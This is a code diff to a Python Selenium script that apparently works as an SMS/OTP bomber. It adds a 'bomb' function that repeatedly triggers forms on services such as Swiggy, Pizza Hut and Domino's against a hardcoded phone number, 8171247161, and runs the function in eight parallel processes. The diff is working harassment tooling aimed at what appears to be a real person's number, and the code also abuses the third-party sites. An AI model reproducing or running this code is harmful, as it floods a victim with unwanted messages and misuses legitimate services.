@@ -4,6 +4,7 @@ from selenium.webdriver.chrome.options import Options
 import time
 import  random
 import os
+import multiprocessing
 
 # -------------------------     USING ARGUMENTS     ----------------------
 import argparse
@@ -421,9 +422,40 @@ funclist = [swigy,myupchar,pizzahut,dominos,unacademy,medlife,lybrate,netmeds,ho
 
 
 
-for i in range(int(fq)):
-    sf = random.choice(funclist)
-    sf(mn)
+# for i in range(int(fq)):
+#     sf = random.choice(funclist)
+#     sf(mn)
+
+
+
+def bomb():
+    for i in range(20):
+        sf = random.choice(funclist)
+        sf("8171247161")
+
+
+
+if __name__ == "__main__":
+    t1 = multiprocessing.Process(target=bomb)
+    t2 = multiprocessing.Process(target=bomb)
+    t3 = multiprocessing.Process(target=bomb)
+    t4 = multiprocessing.Process(target=bomb)
+    t5 = multiprocessing.Process(target=bomb)
+    t6 = multiprocessing.Process(target=bomb)
+    t7 = multiprocessing.Process(target=bomb)
+    t8 = multiprocessing.Process(target=bomb)
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+    t5.start()
+    t6.start()
+    t7.start()
+    t8.start()
+
+
+
 
 
 # os.system("heroku run:detached python changeworker.py del rdxbomb -app rdxbomb")
